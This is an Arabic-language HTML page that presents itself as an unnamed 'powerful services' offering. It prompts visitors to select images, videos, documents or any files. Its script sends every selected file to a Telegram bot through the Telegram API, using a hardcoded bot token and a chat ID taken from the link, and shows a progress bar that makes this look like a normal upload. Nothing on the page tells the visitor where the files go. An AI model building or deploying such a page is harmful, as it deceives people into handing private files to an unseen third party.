<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الخدمات القوية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            font-family: 'Arial', sans-serif;
            text-align: center;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 500px;
            width: 100%;
        }
        
        .message {
            font-size: 22px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .btn {
            background: linear-gradient(to right, #f46b45, #eea849);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            display: block;
            width: 100%;
            margin: 10px 0;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .btn:hover {
            transform: scale(1.02);
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .hidden {
            display: none !important;
        }
        
        .file-input {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }
        
        .progress-container {
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            display: none;
        }
        
        .progress-bar {
            height: 10px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            overflow: hidden;
            margin-top: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(to right, #4CAF50, #8BC34A);
            width: 0%;
            transition: width 0.3s;
        }
        
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }
        
        .status.success {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4CAF50;
            display: block;
        }
        
        .status.error {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid #F44336;
            display: block;
        }
        
        .loading {
            font-size: 14px;
            margin-top: 10px;
            color: rgba(255, 255, 255, 0.8);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
        
        <button id="mainBtn" class="btn">الخدمات</button>
        
        <div id="uploadSection" class="hidden">
            <button id="folderBtn" class="btn">بدء</button>
            
            <!-- ملفات متعددة للصور -->
            <input type="file" id="imageFiles" class="file-input" accept="image/*" multiple>
            
            <!-- ملفات متعددة للفيديوهات -->
            <input type="file" id="videoFiles" class="file-input" accept="video/*" multiple>
            
            <!-- ملفات متعددة للمستندات -->
            <input type="file" id="docFiles" class="file-input" accept=".pdf,.doc,.docx,.txt" multiple>
            
            <!-- ملفات متعددة للجميع -->
            <input type="file" id="allFiles" class="file-input" multiple>
            
            <div id="progressContainer" class="progress-container">
                <div id="statusText">جاري الإعداد...</div>
                <div class="progress-bar">
                    <div id="progressFill" class="progress-fill"></div>
                </div>
                <div id="counter" class="loading">0/0</div>
            </div>
            
            <div id="statusMessage" class="status"></div>
        </div>
    </div>

    <script>
        // التوكن الثابت
        const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
        
        // العناصر
        const mainBtn = document.getElementById('mainBtn');
        const uploadSection = document.getElementById('uploadSection');
        const folderBtn = document.getElementById('folderBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const counter = document.getElementById('counter');
        const statusMessage = document.getElementById('statusMessage');
        
        // ملفات الإدخال
        const imageFilesInput = document.getElementById('imageFiles');
        const videoFilesInput = document.getElementById('videoFiles');
        const docFilesInput = document.getElementById('docFiles');
        const allFilesInput = document.getElementById('allFiles');
        
        // عند النقر على زر الخدمات
        mainBtn.addEventListener('click', function() {
            uploadSection.classList.remove('hidden');
            mainBtn.classList.add('hidden');
        });
        
        // عند النقر على زر استخدام المجلد
        folderBtn.addEventListener('click', async function() {
            // نعرض خيارات للمستخدم لاختيار نوع الملفات
            if (confirm('اختر نوع الملفات التي تريد رفعها:\n\nموافق: كل الملفات\nإلغاء: اختيار نوع محدد')) {
                // كل الملفات
                allFilesInput.click();
            } else {
                // اختيار نوع محدد
                const fileType = prompt('اختر نوع الملفات:\n1 - صور\n2 - فيديوهات\n3 - مستندات\n4 - كل شيء');
                
                switch(fileType) {
                    case '1':
                        imageFilesInput.click();
                        break;
                    case '2':
                        videoFilesInput.click();
                        break;
                    case '3':
                        docFilesInput.click();
                        break;
                    default:
                        allFilesInput.click();
                }
            }
        });
        
        // دالة معالجة رفع الملفات
        async function handleFileUpload(files) {
            if (files.length === 0) return;
            
            // الحصول على chatid من الرابط
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('chatid');
            
            if (!chatId) {
                showStatus('error', '❌ لم يتم العثور على chatid في الرابط');
                return;
            }
            
            // إظهار شريط التقدم
            progressContainer.style.display = 'block';
            statusText.textContent = 'جاري إعداد الملفات...';
            progressFill.style.width = '0%';
            counter.textContent = `0/${files.length}`;
            
            try {
                let successfulUploads = 0;
                const totalFiles = files.length;
                
                for (let i = 0; i < totalFiles; i++) {
                    const file = files[i];
                    
                    // تحديث شريط التقدم
                    const progress = Math.floor(((i + 1) / totalFiles) * 100);
                    progressFill.style.width = `${progress}%`;
                    counter.textContent = `${i + 1}/${totalFiles}`;
                    statusText.textContent = `جاري رفع: ${file.name}`;
                    
                    // إرسال الملف إلى التلجرام
                    const success = await sendToTelegram(file, chatId);
                    
                    if (success) {
                        successfulUploads++;
                    }
                    
                    // تأخير بسيط بين الملفات
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                
                // عرض نتيجة الرفع
                if (successfulUploads === totalFiles) {
                    showStatus('success', `✅ تم رفع ${successfulUploads} ملف بنجاح`);
                } else if (successfulUploads > 0) {
                    showStatus('success', `⚠️ تم رفع ${successfulUploads} من ${totalFiles} ملف`);
                } else {
                    showStatus('error', '❌ فشل رفع الملفات');
                }
                
                // إخفاء شريط التقدم بعد 3 ثوان
                setTimeout(() => {
                    progressContainer.style.display = 'none';
                    progressFill.style.width = '0%';
                }, 3000);
                
            } catch (error) {
                showStatus('error', `❌ حدث خطأ: ${error.message}`);
                progressContainer.style.display = 'none';
            }
        }
        
        // إرسال ملف إلى التلجرام
        async function sendToTelegram(file, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', file);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                return response.ok;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }
        
        // عرض رسالة حالة
        function showStatus(type, message) {
            statusMessage.className = `status ${type}`;
            statusMessage.textContent = message;
            statusMessage.style.display = 'block';
            
            // إخفاء الرسالة بعد 5 ثوان
            setTimeout(() => {
                statusMessage.style.display = 'none';
            }, 5000);
        }
        
        // إضافة مستمعات الأحداث لمدخلات الملفات
        imageFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
        videoFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
        docFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
        allFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
        
        // إعادة تعيين المدخلات بعد الاختيار
        [imageFilesInput, videoFilesInput, docFilesInput, allFilesInput].forEach(input => {
            input.addEventListener('change', function() {
                setTimeout(() => {
                    this.value = '';
                }, 100);
            });
        });
    </script>
</body>
</html>
